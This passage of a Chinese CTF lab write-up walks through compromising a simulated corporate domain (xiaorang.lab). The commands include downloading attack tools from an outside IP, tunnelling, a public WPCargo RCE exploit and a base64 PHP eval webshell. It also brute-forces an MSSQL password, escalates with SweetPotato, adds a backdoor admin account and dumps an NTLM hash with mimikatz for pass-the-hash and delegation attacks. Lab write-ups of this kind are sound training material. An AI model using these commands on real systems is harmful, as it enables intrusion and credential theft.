&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">base64 &lt;span class="s2">&amp;#34;/home/redis/flag/flag01&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> base64 --decode
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag2">flag2
&lt;/h2>&lt;p>传fscan和Ligolo-ng&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> /tmp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget http://160.30.231.213:8080/fscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget http://160.30.231.213:8080/agent
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod +x *
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>/etc/hosts&lt;/code>文件里面拿到内网IP&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;span class="lnt">43
&lt;/span>&lt;span class="lnt">44
&lt;/span>&lt;span class="lnt">45
&lt;/span>&lt;span class="lnt">46
&lt;/span>&lt;span class="lnt">47
&lt;/span>&lt;span class="lnt">48
&lt;/span>&lt;span class="lnt">49
&lt;/span>&lt;span class="lnt">50
&lt;/span>&lt;span class="lnt">51
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.2.3 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.2.7 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.2.18 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.2.34 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">(&lt;/span>icmp&lt;span class="o">)&lt;/span> Target 172.22.2.16 is alive
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Icmp alive hosts len is: &lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.7:6379 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.16:1433 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.16:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.18:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.34:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.3:445 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.16:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.34:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.18:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.3:139 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.34:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.16:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.3:135 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.16:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.18:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.18:22 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.7:80 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.7:22 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.7:21 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">172.22.2.3:88 open
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> alive ports len is: &lt;span class="m">20&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">start vulscan
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.2.7 code:200 len:4833 title:Welcome to CentOS
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.2.16
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>MSSQLSERVER
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.2.16
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.2.34
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>CLIENT01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.2.34
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.2.3 &lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> DC:DC.xiaorang.lab Windows Server &lt;span class="m">2016&lt;/span> Datacenter &lt;span class="m">14393&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.2.34 XIAORANG&lt;span class="se">\C&lt;/span>LIENT01
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetInfo
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span>172.22.2.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>DC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>172.22.2.3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.2.16 code:404 len:315 title:Not Found
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.2.16 MSSQLSERVER.xiaorang.lab Windows Server &lt;span class="m">2016&lt;/span> Datacenter &lt;span class="m">14393&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OsInfo 172.22.2.16 &lt;span class="o">(&lt;/span>Windows Server &lt;span class="m">2016&lt;/span> Datacenter 14393&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NetBios 172.22.2.18 WORKGROUP&lt;span class="se">\U&lt;/span>BUNTU-WEB02
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OsInfo 172.22.2.3 &lt;span class="o">(&lt;/span>Windows Server &lt;span class="m">2016&lt;/span> Datacenter 14393&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> ftp 172.22.2.7:21:anonymous
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&amp;gt;&lt;span class="o">]&lt;/span>pub
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> WebTitle http://172.22.2.18 code:200 len:57738 title:又一个WordPress站点
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>整理一下&lt;/p>
&lt;ul>
&lt;li>172.22.2.18 WordPress并且是WORKGROUP\UBUNTU-WEB02&lt;/li>
&lt;li>172.22.2.16 MSSQLSERVER.xiaorang.lab&lt;/li>
&lt;li>172.22.2.3 DC.xiaorang.lab&lt;/li>
&lt;li>172.22.2.7 已经被控&lt;/li>
&lt;li>172.22.2.34 XIAORANG\CLIENT01&lt;/li>
&lt;/ul>
&lt;p>搭建代理&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nohup ./agent -bind 0.0.0.0:10010 &amp;gt; agent.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo ./proxy -selfcert -laddr &lt;span class="s2">&amp;#34;0.0.0.0:10001&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect_agent --ip 39.98.116.123:10010
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">interface_list
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">session
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">autoroute
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nohup ./gost -L&lt;span class="o">=&lt;/span>socks://:1080 &amp;gt; gost.log 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="m">1&lt;/span> &lt;span class="p">&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 查看是否开启&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ss -luntp
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>打这个WP用wpscan扫描一下&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">wpscan --update
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wpscan --url http://172.22.2.18
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>扫描出WPCargo插件 6.x.x版本 RCE漏洞 &lt;a class="link" href="https://github.com/biulove0x/CVE-2021-25003" target="_blank" rel="noopener"
>https://github.com/biulove0x/CVE-2021-25003&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">git clone https://github.com/biulove0x/CVE-2021-25003.git
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">cd&lt;/span> CVE-2021-25003/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 WpCargo.py --help
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">python3 WpCargo.py -t http://172.22.2.18/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/1.png"
width="1347"
height="860"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/1_hu_4ba661c3a151c8f4.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/1_hu_9a0899ff21870ef.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="156"
data-flex-basis="375px"
>&lt;/p>
&lt;p>写个木马上去链接一下&lt;code>2=echo PD9waHAgZXZhbCgkX1BPU1RbMTIzXSk7Pz4=|base64 -d &amp;gt; /var/www/html/shell.php&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/2.png"
width="1540"
height="1039"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/2_hu_da2dd1ec24d329a4.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/2_hu_bf76a0a1957a2cdd.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="148"
data-flex-basis="355px"
>&lt;/p>
&lt;p>拿到数据库账号密码，链一下&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/3.png"
width="1131"
height="714"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/3_hu_9a2d35b113a7440.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/3_hu_24c0d687b71f2eb4.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="158"
data-flex-basis="380px"
>&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/4.png"
width="1543"
height="1043"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/4_hu_4e9dd66e520d28e4.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/4_hu_e59f5df810e3e16e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="147"
data-flex-basis="355px"
>&lt;/p>
&lt;p>发现flag2和密码，把&lt;strong>密码&lt;/strong>导出来进行爆破，用户名不需要&lt;/p>
&lt;h2 id="flag3">flag3
&lt;/h2>&lt;p>接下来打&lt;strong>MSSQLSERVER.xiaorang.lab&lt;/strong>，https://github.com/shack2/SNETCracker/releases 用工具进行爆破，我是win10直接用的exe就行&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/5.png"
width="1315"
height="1063"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/5_hu_35a2642701d4f542.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/5_hu_313fef4eefdb2d8e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="123"
data-flex-basis="296px"
>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">172.22.2.16----SQLServer----1433----sa----ElGNkOiC
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>激活组件，发现权限不够，但是有&lt;strong>SeImpersonatePrivilege&lt;/strong>，上传甜土豆提权&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">C:/Users/Public/SweetPotato.exe -a &lt;span class="s2">&amp;#34;whoami&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:/Users/Public/SweetPotato.exe -a &lt;span class="s2">&amp;#34;netstat -ano&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>新建一个用户RDP上去，拿到flag3&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;net user test1 baozongwi123! /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;net localgroup administrators test1 /add&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="flag4">flag4
&lt;/h2>&lt;p>我们先拿机器用户的&lt;code>NTHash&lt;/code>，传一个mimikatz.exe到桌面，&lt;code>systeminfo&lt;/code>查看到在域里面，用管理员权限打开猕猴桃&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sekurlsa::logonpasswords
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/6.png"
width="1517"
height="808"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/6_hu_dbd192ed17bb7029.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/6_hu_981ba3bf1576cd5e.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="187"
data-flex-basis="450px"
>&lt;/p>
&lt;p>拿到NTHash之后直接PTH攻击，懒得制作银票&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">sekurlsa::pth /user:MSSQLSERVER$ /domain:XIAORANG.LAB /ntlm:4f4be8211219a166ed7d4db9f3ea90f1
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">net user /domain
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/PixPin_2025-06-18_13-32-31.gif"
width="2051"
height="1237"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/PixPin_2025-06-18_13-32-31_hu_add6da250e93046d.gif 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/PixPin_2025-06-18_13-32-31_hu_a62bd7deb87e7636.gif 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="165"
data-flex-basis="397px"
>&lt;/p>
&lt;p>收集域内信息&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-cmd" data-lang="cmd">&lt;span class="line">&lt;span class="cl">&lt;span class="k">cd&lt;/span> C:\Users\test1\Desktop
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SharpHound.exe -c all
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>直接找到这个机器用户看到入站执行权限里面DC是他的受约束委派用户&lt;/p>
&lt;p>&lt;img src="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/7.png"
width="1569"
height="739"
srcset="https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/7_hu_56df991c5821ae63.png 480w, https://baozongwi.xyz/p/springautumn-cloudmirror-brute4road/7_hu_d76e3b9786586ed0.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="212"
data-flex-basis="509px"
>&lt;/p>
&lt;blockquote>
&lt;p>In the following example, &lt;em>victim&lt;/em> is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, &lt;em>victim&lt;/em> has the &amp;ldquo;HTTP/PRIMARY.testlab.local&amp;rdquo; service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the &lt;em>victim&lt;/em> user and executes the S4U2self/S4U2proxy process to impersonate the &amp;ldquo;admin&amp;rdquo; user to the &amp;ldquo;HTTP/PRIMARY.testlab.local&amp;rdquo; SPN. The alternative sname &amp;ldquo;cifs&amp;rdquo; is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the &amp;ldquo;admin&amp;rdquo; user.
在以下示例中，&lt;em>victim&lt;/em> 是为受约束委派配置的攻击者控制的帐户（即哈希值是已知的）。也就是说，&lt;em>victim&lt;/em> 在其 msds-AllowedToDelegateTo 属性中设置了“HTTP/PRIMARY.testlab.local”服务主体名称 （SPN）。该命令首先为 &lt;em>受害者&lt;/em> 用户请求 TGT，并执行 S4U2self/S4U2proxy 进程，将“admin”用户模拟到“HTTP/PRIMARY.testlab.local”SPN。替代名称“cifs”将替换到最终服务票证中，并将票证提交到当前登录会话。这使攻击者能够以“admin”用户身份访问 PRIMARY.testlab.local 的文件系统。&lt;/p>&lt;/blockquote>
&lt;p>可以进行约束委派攻击&lt;strong>FULL S4U2&lt;/strong>，有了机器用户的&lt;code>NTHash&lt;/code>就可以申请TGT&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
